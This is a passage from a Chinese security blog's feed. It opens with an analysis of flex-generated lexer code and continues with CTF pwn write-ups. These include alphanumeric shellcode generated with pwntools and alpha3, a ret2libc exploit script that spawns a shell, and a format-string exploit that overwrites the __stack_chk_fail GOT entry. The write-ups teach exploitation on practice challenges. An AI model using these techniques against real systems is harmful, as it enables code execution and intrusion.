yy_nxt[yy_current_state][ YY_SC_TO_UI(*yy_cp) ]) &gt; <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">if</span> ( yy_accept[yy_current_state] )</span><br><span class="line">                &#123;</span><br><span class="line">                (yy_last_accepting_state) = yy_current_state;</span><br><span class="line">                (yy_last_accepting_cpos) = yy_cp;</span><br><span class="line">                &#125;</span><br><span class="line">            ++yy_cp;</span><br><span class="line"> &#125;</span><br><span class="line">        yy_current_state = -yy_current_state;</span><br><span class="line"> </span><br><span class="line">yy_find_action:</span><br><span class="line">        <span class="comment">// 状态转移完了，查看转移后的状态是否出于可接受状态</span></span><br><span class="line">        yy_act = yy_accept[yy_current_state];</span><br><span class="line"> </span><br><span class="line">        YY_DO_BEFORE_ACTION;</span><br><span class="line"> </span><br><span class="line">do_action:    <span class="comment">/* 这里主要是处理读取到EOF的情况. */</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">switch</span> ( yy_act )    &#123; <span class="comment">/* beginning of action switch */</span></span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="comment">// yy_accept中值为1为接受状态，其他状态不合法 </span></span><br><span class="line">        &#123;<span class="keyword">return</span> <span class="literal">true</span> ;&#125;</span><br><span class="line">        YY_BREAK</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">case</span> <span class="title">YY_STATE_EOF</span><span class="params">(INITIAL)</span>:</span></span><br><span class="line"><span class="function">        <span class="title">yyterminate</span><span class="params">()</span></span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">case</span> YY_END_OF_BUFFER:</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="comment">/* Amount of text matched not including the EOB char. */</span></span><br><span class="line">        <span class="keyword">int</span> yy_amount_of_matched_text = (<span class="keyword">int</span>) (yy_cp - (yytext_ptr)) - <span class="number">1</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// 还原YY_DO_BEFORE_ACTION做出的变动</span></span><br><span class="line">        *yy_cp = (yy_hold_char);</span><br><span class="line">        YY_RESTORE_YY_MORE_OFFSET</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// 调整buffer，其中有对EOB的不同情况的处理等等</span></span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        YY_FATAL_ERROR(<span class="string">"fatal flex scanner internal error--no action found"</span> );</span><br><span class="line">        &#125; <span class="comment">/* end of action switch */</span></span><br><span class="line">    &#125; <span class="comment">/* end of scanning one token */</span></span><br><span class="line">    &#125; <span class="comment">/* end of user's declarations */</span></span><br><span class="line">&#125; <span class="comment">/* end of yylex */</span></span><br></pre></td></tr></table></figure><p>我们从中可以看出，<strong>1</strong> 是我们起始状态的起点,在进行正则匹配的时候，我们从这个状态开始不断的读入字符，不断的进行状态转移，最终会停在某个节点。此时我们就会判断当前状态对应的数值,如果是 <strong>1</strong> 则表示 accept 状态，如果不是则为非法的，这里面的两个 <code>1</code> <strong>含义完全不同</strong>：前者是状态的标识，后者则是标志某个状态是否是接受状态。</p><p>上面的 DFA 伪代码可以抽象成</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">state= <span class="number">0</span>; </span><br><span class="line"><span class="built_in">get</span> next input character</span><br><span class="line"><span class="keyword">while</span> (<span class="keyword">not</span> <span class="built_in">end</span> of input) &#123;</span><br><span class="line">    depending on current state <span class="keyword">and</span> input character</span><br><span class="line">        match: <span class="comment">/* input expected */</span></span><br><span class="line">            calculate <span class="keyword">new</span> state; <span class="built_in">get</span> next input character</span><br><span class="line">        accept: <span class="comment">/* current pattern completely matched */</span></span><br><span class="line">            state= <span class="number">0</span>; perform action corresponding to pattern</span><br><span class="line">        error: <span class="comment">/* input unexpected */</span></span><br><span class="line">            state= <span class="number">0</span>; echo <span class="number">1</span>st character input after last accept <span class="keyword">or</span> error;</span><br><span class="line">            reset input to <span class="number">2</span>nd character input after last accept <span class="keyword">or</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>总结就是从开始状态开始，读取字符并结合状态跳转表来进行状态跳转，当无法继续跳转的时候或字符已经读取完成,此时判断是否是 accept 的状态，并执行用户定义的规则代码。</p><h3 id="压缩状态矩阵"><a href="#压缩状态矩阵" class="headerlink" title="压缩状态矩阵"></a>压缩状态矩阵</h3><p>状态跳转表以及accept表如下</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">yyconst <span class="keyword">flex_int16_t</span> yy_accept[<span class="number">10</span>]</span><br><span class="line">yyconst YY_CHAR yy_ec[<span class="number">256</span>]</span><br><span class="line">yyconst YY_CHAR yy_meta[<span class="number">7</span>]</span><br><span class="line">yyconst <span class="keyword">flex_uint16_t</span> yy_base[<span class="number">12</span>]</span><br><span class="line">yyconst <span class="keyword">flex_int16_t</span> yy_def[<span class="number">12</span>]</span><br><span class="line">yyconst <span class="keyword">flex_uint16_t</span> yy_nxt[<span class="number">19</span>]</span><br><span class="line">yyconst <span class="keyword">flex_int16_t</span> yy_chk[<span class="number">19</span>]</span><br></pre></td></tr></table></figure><p>而此时 match 中的代码就会变为</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">yy_current_state = (yy_start);</span><br><span class="line">yy_match:</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">register</span> YY_CHAR yy_c = yy_ec[YY_SC_TO_UI(*yy_cp)] ;</span><br><span class="line">    <span class="comment">// 这个if语句就不影响状态转移，只是为了记录状态</span></span><br><span class="line">    <span class="keyword">if</span> ( yy_accept[yy_current_state] )</span><br><span class="line">        &#123;</span><br><span class="line">        (yy_last_accepting_state) = yy_current_state;</span><br><span class="line">        (yy_last_accepting_cpos) = yy_cp;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">while</span> ( yy_chk[yy_base[yy_current_state] + yy_c] != yy_current_state )</span><br><span class="line">        &#123;</span><br><span class="line">        yy_current_state = (<span class="keyword">int</span>) yy_def[yy_current_state];</span><br><span class="line">        <span class="comment">// 注意这个22是Magic Number，随accept数量变化</span></span><br><span class="line">        <span class="keyword">if</span> ( yy_current_state &gt;= <span class="number">22</span> )</span><br><span class="line">            yy_c = yy_meta[(<span class="keyword">unsigned</span> <span class="keyword">int</span>) yy_c];</span><br><span class="line">        &#125;</span><br><span class="line">    yy_current_state = yy_nxt[yy_base[yy_current_state] + (<span class="keyword">unsigned</span> <span class="keyword">int</span>) yy_c];</span><br><span class="line">    ++yy_cp;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// 这个43也是Magic Number</span></span><br><span class="line"><span class="keyword">while</span> ( yy_base[yy_current_state] != <span class="number">43</span> );</span><br></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>从生成代码中我们<strong>最需要知道</strong>的就是：DFA 的状态转移图(以矩阵的形式体现出来),以及理解如何使用状态转移图的,也就是理解 <code>yylex()</code> 函数的具体实现,它其中定义了各个状态的含义。那么从代码中我们也能知道<code>yy_nxt[yy_current_state][ YY_SC_TO_UI(*yy_cp) ]</code>中 yy_nxt 就是我们的状态跳转表，YY_SC_TO_UI 能够将我们的字符转成相应的 ascii，yy_cp 指针指向我们要读取的字符。这样我们的矩阵抽象出来就是我们的每一行代表的是我们的状态，每一列代表的是我们的字符转成ascii后的无符号整数。<strong>一句话概括就是现实生活中的查表</strong>。</p><p>例如一个规则表达式 <code>a(b|c)d*e+</code>，其状态可由下图表示</p><p><img src="/" alt="image-20200625220424190.png" class="lazyload" data-src="https://i.loli.net/2020/06/25/4iISH2a3tJGZToc.png"></p><p>会产生如下状态表</p><p><img src="/" alt="image-20200625220612068.png" class="lazyload" data-src="https://i.loli.net/2020/06/25/ysTpxdPSIjnKCoB.png"></p><ul><li><p>a 表示 accept 状态</p></li><li><p>m(N) 表示跳转到 N 状态</p></li><li><p>空白处则为 error</p></li></ul><p>基本上 flex 生成的代码还是通过匹配循环来实现<code>规则-&gt;行为</code>的模式，不断的调用 yylex 来匹配输出相应的 token。</p><h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p><a href="https://tina2114.github.io/2020/06/16/lexer代码骨架整理/#more" target="_blank" rel="noopener">https://tina2114.github.io/2020/06/16/lexer%E4%BB%A3%E7%A0%81%E9%AA%A8%E6%9E%B6%E6%95%B4%E7%90%86/#more</a></p><p><a href="https://chenyuzhuwhiskey.github.io/2020/06/21/flex-lexer分析/" target="_blank" rel="noopener">https://chenyuzhuwhiskey.github.io/2020/06/21/flex-lexer%E5%88%86%E6%9E%90/</a></p><p><a href="https://happyers.top/uncategorized/understanding-c-lexer-generated-by-flex/#toc-head-1" target="_blank" rel="noopener">https://happyers.top/uncategorized/understanding-c-lexer-generated-by-flex/#toc-head-1</a></p><p><a href="https://blog.finaltheory.me/research/Flex-Tricks.html#b129e" target="_blank" rel="noopener">https://blog.finaltheory.me/research/Flex-Tricks.html#b129e</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;flex生成代码分析&quot;&gt;&lt;a href=&quot;#flex生成代码分析&quot; class=&quot;headerlink&quot; title=&quot;flex生成代码分析&quot;&gt;&lt;/a&gt;flex生成代码分析&lt;/h2&gt;&lt;p&gt;本文从flex源码入手分析flex框架。&lt;/p&gt;
&lt;p&gt;flex会根据我们所
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>关于纯字符shellcode的编写</title>
    <link href="https://billyotry.github.io/2020/04/14/%E5%85%B3%E4%BA%8E%E7%BA%AF%E5%AD%97%E7%AC%A6shellcode%E7%9A%84%E7%BC%96%E5%86%99/"/>
    <id>https://billyotry.github.io/2020/04/14/%E5%85%B3%E4%BA%8E%E7%BA%AF%E5%AD%97%E7%AC%A6shellcode%E7%9A%84%E7%BC%96%E5%86%99/</id>
    <published>2020-04-14T15:32:55.317Z</published>
    <updated>2020-06-29T01:50:25.775Z</updated>
    
    <content type="html"><![CDATA[<p>在上次MRCTF的时候遇到了一题，虽然只需要输入shellcode，但是对用户的输入字符进行了限制，只能有字母和数字这些可见字符。<strong>在此感谢TaQini师傅对于alphanumeric shellcode编写的指导！</strong>具体参考TaQini师傅的文章</p><p><a href='http://taqini.space/2020/03/31/alpha-shellcode-gen/#alphanumeric-shellcode' target="_blank" rel="noopener">纯字符shellcode生成指南</a></p><p>关键部分:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> (i &lt; len) </span><br><span class="line">&#123;</span><br><span class="line">      <span class="keyword">if</span> (((((<span class="keyword">char</span>)buf[i] &lt; <span class="string">'a'</span>) || (<span class="string">'z'</span> &lt; (<span class="keyword">char</span>)buf[i])) &amp;&amp;</span><br><span class="line">          (((<span class="keyword">char</span>)buf[i] &lt; <span class="string">'A'</span> || (<span class="string">'Z'</span> &lt; (<span class="keyword">char</span>)buf[i])))) &amp;&amp;</span><br><span class="line">         (((<span class="keyword">char</span>)buf[i] &lt; <span class="string">'0'</span> || (<span class="string">'Z'</span> &lt; (<span class="keyword">char</span>)buf[i])))) </span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"I Can\'t Read This!"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      i = i + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">buf();     <span class="comment">//可以看到程序会将我们的输入当成函数执行</span></span><br></pre></td></tr></table></figure><p>我们可以使用alpha3来将pwntools生成shellcode来转为alphanumeric shellcode.</p><p><code>1.python ALPHA3.py x64 ascii mixedcase rax --input=&quot;sc&quot;</code></p><p>在使用这条命令前我们还需要有pwntools生成的shellcode</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#filename  sc.py</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">'amd64'</span>)</span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line"><span class="keyword">print</span> str(shellcode)</span><br></pre></td></tr></table></figure><p>如何将文件的输出输出到sc文件中(不能输出到终端复制过去,有不可见字符)</p><p><code>2.python sc.py &gt; sc</code></p><p>然后我们就可以用1命令生成alphanumeric shellcode(这里的shellcode是会输出的终端,如果你想输出到文件中的话可以去翻官方文档)        ——-&gt;         <a href='https://github.com/SkyLined/alpha3 ' target="_blank" rel="noopener">alpha3</a></p><p><img src="/" alt="QQ图片20200415000820.png" class="lazyload" data-src="https://i.loli.net/2020/04/15/Wi9Jhe4L1NdfDwq.png"></p><p>   Note:这里要还有要注意一个寄存器的问题,因为这里buf函数是<code>call rax</code>所以我们的1命令中使用<code>rax</code>.</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;在上次MRCTF的时候遇到了一题，虽然只需要输入shellcode，但是对用户的输入字符进行了限制，只能有字母和数字这些可见字符。&lt;strong&gt;在此感谢TaQini师傅对于alphanumeric shellcode编写的指导！&lt;/strong&gt;具体参考TaQini师傅的
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>[WUSTCTF]closed</title>
    <link href="https://billyotry.github.io/2020/04/14/[WUSTCTF]closed/"/>
    <id>https://billyotry.github.io/2020/04/14/[WUSTCTF]closed/</id>
    <published>2020-04-14T03:24:58.363Z</published>
    <updated>2020-04-14T16:17:34.955Z</updated>
    
    <content type="html"><![CDATA[<p>标准输出流全关了，需要将<code>stdout</code>重定向到<code>stdin</code>就行了。</p><p><code>cat flag &gt;&amp;0</code> 或 <code>exec 1&gt;&amp;0</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;标准输出流全关了，需要将&lt;code&gt;stdout&lt;/code&gt;重定向到&lt;code&gt;stdin&lt;/code&gt;就行了。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;cat flag &amp;gt;&amp;amp;0&lt;/code&gt; 或 &lt;code&gt;exec 1&amp;gt;&amp;amp;0&lt;/code&gt;&lt;/p&gt;

      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>[HarekazeCTF2019]baby_rop2</title>
    <link href="https://billyotry.github.io/2020/04/05/[HarekazeCTF2019]baby_rop2/"/>
    <id>https://billyotry.github.io/2020/04/05/[HarekazeCTF2019]baby_rop2/</id>
    <published>2020-04-05T09:30:46.507Z</published>
    <updated>2020-04-05T09:45:15.087Z</updated>
    
    <content type="html"><![CDATA[<p>ida,checksec,F5三连。</p><p><img src="/" alt="QQ图片20200405170524.png" class="lazyload" data-src="https://i.loli.net/2020/04/05/5apPnyXTNwvJV3C.png"></p><img src="/" alt="QQ图片20200405165940.png" style="zoom: 50%;" / class="lazyload" data-src="https://i.loli.net/2020/04/05/bjnJQi1MAlfkHgu.png"><img src="/" alt="QQ图片20200405170003.png" style="zoom: 67%;" / class="lazyload" data-src="https://i.loli.net/2020/04/05/F8Hd9licxIUzNsp.png"><p>很简单的ROP，利用printf函数泄露出地址就行。</p><p>但是这道题一开始我没做出来是因为我忘了<strong>printf函数泄露地址里面是要有%s参数的</strong>。(可能是puts的题目做习惯了)</p><p>exp：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process('./babyrop2')</span></span><br><span class="line">p = remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">28010</span>)</span><br><span class="line">elf = ELF(<span class="string">'babyrop2'</span>)</span><br><span class="line">pop_rdi = <span class="number">0x400733</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x400731</span> </span><br><span class="line">format_str = <span class="number">0x400770</span></span><br><span class="line">ret_addr = <span class="number">0x400734</span></span><br><span class="line">printf_plt = elf.plt[<span class="string">'printf'</span>]</span><br><span class="line">read_got = elf.got[<span class="string">'read'</span>]</span><br><span class="line">main_plt = elf.sym[<span class="string">'main'</span>]</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x28</span>+p64(pop_rdi)+p64(format_str)+p64(pop_rsi_r15)+p64(read_got)+p64(<span class="number">0x123</span>)+p64(printf_plt)+p64(main_plt)</span><br><span class="line">p.recvuntil(<span class="string">"name? "</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">read_addr = u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">'read'</span>, read_addr)</span><br><span class="line">libc_base = read_addr - libc.dump(<span class="string">'read'</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">'system'</span>)</span><br><span class="line">bin_sh = libc_base + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x28</span>+p64(pop_rdi)+p64(bin_sh)+p64(sys_addr)+p64(<span class="number">0</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>Note:这里用有个r15是因为用ROPgadget查看发现gadget是这样的：</p><p><img src="/" alt="QQ图片20200405170950.png" class="lazyload" data-src="https://i.loli.net/2020/04/05/2MaTJgPRySKrm5Y.png"></p><p>所以这里的r15不用管，随便填就行了。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;ida,checksec,F5三连。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/&quot; alt=&quot;QQ图片20200405170524.png&quot; class=&quot;lazyload&quot; data-src=&quot;https://i.loli.net/2020/04/05/5apPnyXTNwvJ
      
    
    </summary>
    
    
      <category term="BUUOJ" scheme="https://billyotry.github.io/categories/BUUOJ/"/>
    
    
  </entry>
  
  <entry>
    <title>[BJD2nd]r2t4</title>
    <link href="https://billyotry.github.io/2020/03/23/[BJD2nd]r2t4/"/>
    <id>https://billyotry.github.io/2020/03/23/[BJD2nd]r2t4/</id>
    <published>2020-03-23T12:49:53.321Z</published>
    <updated>2020-04-27T13:08:55.252Z</updated>
    
    <content type="html"><![CDATA[<p>第一步当然就是日常查保护啦！</p><p>会看到堆栈不可执行还有NX保护</p><p><img src="/" alt="image-20200323213631230.png" class="lazyload" data-src="https://i.loli.net/2020/03/24/3TGJyWszCMu9dfO.png"></p><p>然后就丢进IDA，F5</p><p><img src="/" alt="image-20200323214009122.png" class="lazyload" data-src="https://i.loli.net/2020/03/24/N7gIPZSzXCDVjsv.png"></p><p><img src="/" alt="image-20200323214325901.png" class="lazyload" data-src="https://i.loli.net/2020/03/24/8djRsrFqJOf93mx.png"></p><p>很明显的格式化字符串，发现出题人还留了后门函数，但是这个backdoor这个英语给我整笑了。这里一开始的思路是利用栈溢出泄露canary出来后然后填在ebp-8的位置上绕过栈保护，再控制程序流程去执行后门函数。想了半天也不知道为什么，调试程序的时候发现他只有一次输入一次输入，就是说泄露的canary之后没法再把payload输进去，想了半天都不知道怎么办，甚至还一度的怀疑是出题人出错了。</p><p>后来想到了这里并不能通过格式化泄露canary来绕过栈保护，而是进入任意地址写，将后门函数写进返回地址里面，又做了好久依旧没有打通，后来经过1p0ch师傅的指点，这里应该要将后门函数写到stack_chk_fail里面。我们知道当canary被修改了之后，会触发stack_chk_fail函数，所以可以利用这一点。(不过这种操作也是第一次听说，学到了)。</p><p>接下来先看下偏移是多少</p><p><img src="/" alt="image-20200323220148164.png" class="lazyload" data-src="https://i.loli.net/2020/03/24/aJWXOuUT9jMkFlg.png"></p><p>很明显看到偏移是6</p><p>那么我们接下来就可以写exp了</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">'./r2t4'</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">'./r2t4'</span>)</span><br><span class="line">stack_addr=elf.got[<span class="string">'__stack_chk_fail'</span>]</span><br><span class="line"></span><br><span class="line">backdoor=<span class="number">0x400626</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">'%1574c%8$hnaaaaa'</span>+p64(`stack_addr)+<span class="string">'a'</span>*<span class="number">12</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>1574是0x626是十进制</p><p>这里偏移为8是因为’%1574c%8’为偏移6，’$hnaaaaa’为偏移7，那么要写入的p64(stack_addr)就是偏移8了。后面的aaaaa是为了对齐地址。</p><p>这里为了触发__stack_chk_fail，payload的长度就要是0x30,也就是48.</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;第一步当然就是日常查保护啦！&lt;/p&gt;
&lt;p&gt;会看到堆栈不可执行还有NX保护&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/&quot; alt=&quot;image-20200323213631230.png&quot; class=&quot;lazyload&quot; data-src=&quot;https://i.loli.net
      
    
    </summary>
    
    
    
  </entry>
  
</feed>
